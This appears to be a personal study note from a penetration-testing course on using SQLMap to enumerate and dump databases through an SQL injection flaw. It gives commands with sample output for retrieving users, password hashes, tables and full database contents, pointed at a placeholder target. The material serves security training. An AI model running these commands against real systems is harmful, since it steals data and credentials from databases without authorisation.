
***
###### `Title :- Database Enumeration`
###### `Created on :- 2023-06-23 - 05:56`
###### `Created by:- Prem J`
***

- After the detection and confirmation of exploitability of the targeted SQLi vulnerability. We perform enumeration which consists of lookup and retrieval (i.e. exfiltration) of all available information from the vulnerable database.

#### `SQLMap Data retrieval -->`

- for data retrieval SQLMap has a predefined set of queries for all DBMSes, where each entry represents the SQL that must be run at the target to retrieve desired content.
- For example, [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) contains the SQL's for MySQL DBMS.
- For example, if a user wants to retrieve the "banner" (switch `--banner`) for the target based on MySQL DBMS, the `VERSION()` query will be used for such purpose.  
- In case of retrieval of the current user name (switch `--current-user`), the `CURRENT_USER()` query will be used.

#### `Basic Database Data Enumeration -->`

- Upon detection of an SQLi vulnerability, we can begin enumeration of basic details

banner --> `--banner`
current user's name --> `--current-user`
current db name --> `--current-db`

- Upon checking the user permissions (if admin) we can proceed further by using addition enumeration commands.

hostname --> `--hostname`
password hashes --> `--passwords`

```shell-session
prem@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

***SNIP***
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/
```

>[!Note]
>The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.

#### `Table Enumeration -->`

```shell-session
premjampuram@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

...SNIP...
[13:59:24] [INFO] fetching tables for database: 'testdb'
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

- We use the `--tables` switch to list the tables in the DB mentioned, upon listing we can use the `-T` switch to filter the specific table we intent to retrieve data (`--dump`) from.

```shell-session
premjampuram@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

>[!tip]
>Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.

#### `Table and Row Enumeration -->`

- When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only `name` and `surname` columns) with the `-C` option, as follows

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

- To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:

```shell-session
prem@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

...SNIP...
Database: testdb

Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

#### `Conditional Enumeration -->`

- If there is a requirement to retrieve certain rows based on a known `WHERE`condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:

```shell-session
prem@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```

#### `Full DB Enumeration -->`

- Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of `-T` altogether which specifies the specific table that need to be retrieved.
- By simply using the switch `--dump` without specifying a table with `-T`, all of the ***current database*** content will be retrieved. As for the `--dump-all` switch, all the content from ***all the databases*** will be retrieved.
- In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to ***skip the retrieval of content from system databases***, as it is usually of little interest for pentesters.